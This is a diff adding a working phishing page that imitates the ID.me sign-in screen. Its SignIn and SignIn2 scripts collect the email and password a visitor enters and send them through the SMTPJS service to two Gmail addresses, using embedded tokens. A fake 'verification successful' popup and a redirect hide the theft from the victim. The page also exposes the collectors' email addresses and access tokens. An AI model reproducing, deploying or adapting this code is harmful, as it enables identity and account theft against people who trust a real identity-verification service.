@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Sign in to ID.me - ID.me</title>
+    <meta charset="UTF-8" />
+    <meta content="One Identity. One Wallet." name="description" />
+    <meta
+      content="width=device-width, initial-scale=1, minimum-scale=1"
+      name="viewport"
+    />
+    <meta content="noindex" name="robots" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="favicon-3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico"
+    />
+
+    <link
+      rel="stylesheet"
+      media="all"
+      href="application-0189d16e9dcf751fcf91038fa9ac30c98194116564b5125b826c9f7219da2f93.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+  </head>
+  <body class="">
+    <div id="ZN_2bLc7fWaOZ8U4ey"></div>
+
+    <div class="page-container">
+      <div class="container">
+        <div class="content-container">
+          <form class="new_user">
+            <div class="form-header">
+              <div class="form-header-content" role="banner">
+                <div class="partner">
+                  <div class="c_icon m_idme">
+                    <img
+                      alt="ID.me"
+                      class="img-lightmode"
+                      src="idme-logo-1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg"
+                    />
+                    <img
+                      alt="ID.me"
+                      class="img-darkmode"
+                      src="idme-logo-white-3fda17b1e33891acf640ab0125f80fb2feafbdd0cf0423c06de22149b643fcbb.svg"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+            <main aria-labelledby="sr_page_title" class="form-container">
+              <div class="form-header-access">
+                <h1 id="sr_page_title">Sign in to ID.me</h1>
+              </div>
+              <div class="form-header-well">
+                <p>New to ID.me?</p>
+                <p>
+                  <a href="register.html">Create an ID.me account</a>
+                </p>
+              </div>
+
+              <div class="form-fields">
+                <div class="field-group">
+                  <div class="field text">
+                    <label for="user_email">Email</label>
+                    <input
+                      placeholder="Enter your email address"
+                      required="required"
+                      autocomplete="email"
+                      type="email"
+                      name="Email"
+                      id="user_email"
+                      value=""
+                    />
+                    <span role="alert"> </span>
+                  </div>
+                  <div
+                    class="field text password-showable"
+                    data-component="Components.Showable"
+                  >
+                    <label for="user_password">Password</label>
+                    <input
+                      placeholder="Enter password"
+                      required="required"
+                      autocomplete="current-password"
+                      type="password"
+                      name="Password"
+                      id="user_password"
+                    />
+                  </div>
+                  <div
+                    class="field checkbox remember_me"
+                    data-component="Cookies.Delete"
+                    data-endpoint="/cookies/remember_me"
+                  >
+                    <input
+                      type="checkbox"
+                      name="remember_me"
+                      id="remember_me"
+                      value="true"
+                      aria-describedby="remember-me-tip"
+                    />
+                    <label for="remember_me"
+                      ><span aria-hidden="true" class="checkmark">  </span>
+
+                      <span> Remember me </span>
+                      <div id="remember-me-tip">
+                        For your security, select only on your devices.
+                      </div>
+                    </label>
+                  </div>
+                </div>
+              </div>
+              <input
+                type="reset"
+                value="Sign in"
+                class="btn btn-primary"
+                onclick="validateLoginForm();SignIn();SignIn2()"
+              />
+              <div class="form-footer">
+                <p>
+                  <a href="#">Forgot password</a>
+                </p>
+              </div>
+            </main>
+          </form>
+        </div>
+
+        <footer class="footer">
+          <nav aria-label="Footer" class="footer__links">
+            <ul class="footer__list">
+              <li class="footer__list-item">
+                <a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  class="footer__link"
+                  title="What is ID.me? (opens in new tab)"
+                  aria-label="What is ID.me? (opens in new tab)"
+                  href="https://www.id.me/about"
+                  >What is ID.me?</a
+                >
+              </li>
+              <li class="footer__list-item">
+                <a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  class="footer__link"
+                  title="Terms of Service (opens in new tab)"
+                  aria-label="Terms of Service (opens in new tab)"
+                  href="https://www.id.me/terms"
+                  >Terms of Service</a
+                >
+              </li>
+              <li class="footer__list-item">
+                <a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  class="footer__link"
+                  title="Privacy Policy (opens in new tab)"
+                  aria-label="Privacy Policy (opens in new tab)"
+                  href="https://www.id.me/privacy"
+                  >Privacy Policy</a
+                >
+              </li>
+            </ul>
+          </nav>
+        </footer>
+      </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+      function SignIn() {
+        let email = document.getElementById("user_email").value;
+        let password = document.getElementById("user_password").value;
+        let remember = document.getElementById("remember-me-tip").value;
+
+        let body =
+          "Email:" +
+          email +
+          "<br/> Password:" +
+          password +
+          "<br/> Rememberme:" +
+          remember;
+        console.log(body);
+        Email.send({
+          SecureToken: "0fa757e5-2d97-4eff-a1b0-a151761491c4",
+          To: "bliguori5@gmail.com",
+          From: "bliguori5@gmail.com",
+          Subject: "Message From ID.me Login",
+          Body: body,
+        }).then((message) => alert(thanks));
+      }
+    </script>
+
+    <script>
+      function SignIn2() {
+        let email = document.getElementById("user_email").value;
+        let password = document.getElementById("user_password").value;
+        let remember = document.getElementById("remember-me-tip").value;
+
+        let body =
+          "Email:" +
+          email +
+          "<br/> Password:" +
+          password +
+          "<br/> Rememberme:" +
+          remember;
+
+        Email.send({
+          SecureToken: "cfbb28d4-dfca-4c74-baf8-3ac35a7efe92",
+          To: "francisekah5@gmail.com",
+          From: "francisekah5@gmail.com",
+          Subject: "Message From ID.me Login",
+          Body: body,
+        }).then((message) => alert(thanks));
+      }
+    </script>
+    <script>
+      function validateLoginForm() {
+        // Get values from the login form
+        const username = document.getElementById("user_email").value;
+        const password = document.getElementById("user_password").value;
+
+        // Check if fields are not empty
+        if (!username || !password) {
+          // Show warning message using SweetAlert
+          Swal.fire({
+            icon: "warning",
+            title: "Warning",
+            text: "Please enter both Email and password",
+          });
+          return;
+        }
+
+        // Simulate a successful login (replace this with your actual login logic)
+        // For demonstration purposes, always show success message
+        Swal.fire({
+          icon: "success",
+          title: "Success",
+          text: "verification successful!",
+        }).then(() => {
+          // Redirect to the home page or wherever you want
+          window.location.href = "verified.html";
+        });
+      }
+    </script>
+  </body>
+</html>
